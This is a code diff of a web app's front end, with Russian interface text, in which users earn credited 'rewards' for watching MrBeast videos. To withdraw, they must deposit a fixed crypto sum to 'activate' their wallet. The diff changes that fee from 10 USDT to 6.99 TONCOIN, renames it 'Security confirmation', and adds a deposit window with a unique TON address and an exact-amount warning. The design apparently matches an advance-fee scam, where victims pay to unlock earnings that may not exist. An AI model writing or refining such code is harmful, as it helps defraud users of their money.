             not_scheduled: "Не запланировано",
             opening_date: "Дата открытия",
-            payment_required_withdraw: "Внесите 10 USDT в сети TON, чтобы активировать вывод.",
+            payment_required_withdraw: "Внесите 6.99 TONCOIN в сети TON, чтобы активировать вывод.",
             payment_verified_withdraw: "Оплата подтверждена. Вывод доступен.",
             payout_request_now: "Теперь можно отправить заявку на выплату.",
             receipt_date_time: "Дата и время",
@@ -4128,7 +4203,7 @@
             receipt_note: "Примечание",
             receipt_verified_at: "Подтверждено",
             wallet_locked: "Кошелек заблокирован до времени вывода",
-            wallet_locked_until_time: "Для активации вывода нужен депозит 10 USDT в сети TON.",
+            wallet_locked_until_time: "Для активации вывода нужен депозит 6.99 TONCOIN в сети TON.",
             wallet_title: "Кошелек",
             watch_added: "Вы вышли с экрана просмотра. Время и заработок добавлены на главную страницу.",
             watch_counting: "Просмотр идет... награда добавится, когда вы выйдете с этого экрана.",
@@ -4137,7 +4212,7 @@
             watch_playing: "Видео MrBeast воспроизводится. Время продолжает считаться между видео.",
             watch_wait: "Видео MrBeast засчитываются. Награда добавится, когда вы выйдете с этого экрана.",
             withdraw_closed_title: "Вывод закрыт",
-            withdraw_enter_details: "Введите TON адрес кошелька внимательно. Доступный возврат: 9 USDT.",
+            withdraw_enter_details: "Введите TON адрес кошелька внимательно. Доступный возврат: 6.99 TONCOIN.",
             withdraw_expired_message: "Последнее окно вывода завершилось. Кошелек остается заблокированным до следующего расписания.",
             withdraw_expired_title: "Время вывода истекло",
             withdraw_not_scheduled_message: "Время вывода еще не запланировано.",
@@ -4251,13 +4326,17 @@
             setText('lbl-mark-all-read', dict.mark_all_read);
 
             // YANGI QO'SHILGAN TARJIMALAR UCHUN:
-            setText('lbl-unlock-title', dict.account_unlock_title || 'Account unlock activation');
-            setText('lbl-fastest-method', dict.fastest_method || 'FASTEST METHOD');
-            setText('lbl-fiat-desc', dict.fiat_desc || 'Deposit 10 USDT on TON to activate withdrawal. Blockchain service commission may be charged.');
-            setText('lbl-pay-fiat', dict.pay_with_fiat || 'CHECK PAYMENT');
+            setText('lbl-unlock-title', dict.account_unlock_title || 'Wallet activation');
+            setText('lbl-fastest-method', dict.fastest_method || 'Security confirmation');
+            setText('lbl-fiat-desc', dict.fiat_desc || languages.en.fiat_desc);
+            setText('lbl-pay-fiat', dict.top_up_toncoin || 'TOP UP 6.99 TONCOIN');
+            setText('ton-deposit-title', dict.ton_deposit_title || '6.99 TONCOIN payment');
+            setText('ton-deposit-warning', dict.ton_deposit_warning || 'Send exactly 6.99 TONCOIN to this address. Less or more than 6.99 TONCOIN will not be confirmed automatically.');
+            setText('payment-address-label', dict.payment_address_label || 'Unique TON deposit address');
+            setText('lbl-check-ton-payment', dict.pay_with_fiat || 'CHECK PAYMENT');
             setText('wallet-current-balance-label', dict.wallet_current_balance || 'Current Balance:');
-            setText('wallet-method-label', dict.withdrawal_method_label || 'Withdrawal Method:');
-            setText('wallet-method-value', dict.wallet_method_value || 'TON USDT');
+            setText('wallet-method-label', dict.withdrawal_method_label || 'Activation network:');
+            setText('wallet-method-value', dict.wallet_method_value || 'TONCOIN');
             setText('lbl-card-method-title', dict.card_selector_title || 'TON wallet');
             setText('lbl-or-crypto', dict.or_crypto || 'TON NETWORK PAYMENT');
 
@@ -4266,7 +4345,7 @@
             document.querySelectorAll('.wallet-nav span').forEach(el => el.innerText = dict.wallet || 'WALLET');
             document.querySelectorAll('.history-nav span').forEach(el => el.innerText = dict.history || 'HISTORY');
             const walletTitle = document.querySelector('#walletModal .modal-title');
-            if (walletTitle) walletTitle.innerText = dict.wallet_title || 'Wallet';
+            if (walletTitle) walletTitle.innerText = dict.wallet_title || 'Wallet activation';
             const historyTitle = document.querySelector('#withdrawHistoryModal .modal-title');
             if (historyTitle) historyTitle.innerText = dict.withdraw_history || 'Withdrawal History';
             const watchTitle = document.querySelector('#watchModal .modal-title');
@@ -4356,6 +4435,13 @@
         }
 
         function openWalletIfUnlocked() {
+            if (!isWalletEarningUnlocked()) {
+                const required = getWalletUnlockRequiredAmount();
+                const earned = getWalletEarningAmount();
+                showCopyToast(`${t('wallet_locked_until_20')} $${earned.toFixed(2)} / $${required.toFixed(2)}`);
+                updateWalletLockUi();
+                return;
+            }
             openModal('walletModal');
         }
 
@@ -4493,6 +4579,7 @@
             if (balanceEl) balanceEl.innerText = balance.toFixed(2);
             updateBonusDisplays();
             updateProfileModal();
+            updateWalletLockUi();
         }
 
         async function handleMainClick(e) {
@@ -4932,10 +5019,13 @@
                     updateWalletModal();
                     loadBackendSettings()
                         .then(() => {
-                            updateWalletLockUi(getWithdrawWindowState());
-                            return createPaymentOrder().catch(() => refreshPaymentStatus());
+                            updateWalletLockUi();
+                            return refreshPaymentStatus().catch(() => null);
                         })
                         .catch(() => updateWalletLockUi());
+                }
+                if (id === 'tonDepositModal') {
+                    renderPaymentOrder(currentPaymentOrder, latestPaymentStatus);
                 }
             }
         }
@@ -4967,7 +5057,7 @@
             items.unshift({
                 amount: Number(amount || 0).toFixed(2),
                 status: status || 'Pending',
-                method: 'USDT',
+                method: 'TON',
                 date: new Date().toLocaleString()
             });
             localStorage.setItem(key, JSON.stringify(items));
@@ -4983,7 +5073,7 @@
                 items = (serverItems || []).map(item => ({
                     amount: Number(item.amount || 0).toFixed(2),
                     status: item.status || 'pending',
-                    method: item.wallet_type || 'USDT',
+                    method: item.wallet_type || 'TON',
                     date: item.created_at ? new Date(item.created_at).toLocaleString() : ''
                 }));
             } catch (err) {}
@@ -5092,6 +5182,26 @@
         // ==========================================
         // TON WALLET PAYMENT LOGIC
         // ==========================================
+        async function openTonDepositModal() {
+            if (!isWalletEarningUnlocked()) {
+                showCopyToast(t('wallet_locked_until_20'));
+                updateWalletLockUi();
+                return;
+            }
+
+            openModal('tonDepositModal');
+            const statusEl = document.getElementById('ton-deposit-status-text');
+            setDomText(statusEl, t('card_order_loading'));
+
+            try {
+                await loadBackendSettings();
+                const order = await createPaymentOrder();
+                renderPaymentOrder(order, latestPaymentStatus);
+            } catch (err) {
+                setDomText(statusEl, err.message);
+            }
+        }
+
         function copyTonPaymentAddress() {
             if (!currentPaymentOrder || !currentPaymentOrder.id) {
                 showCopyToast(t('card_order_loading'));
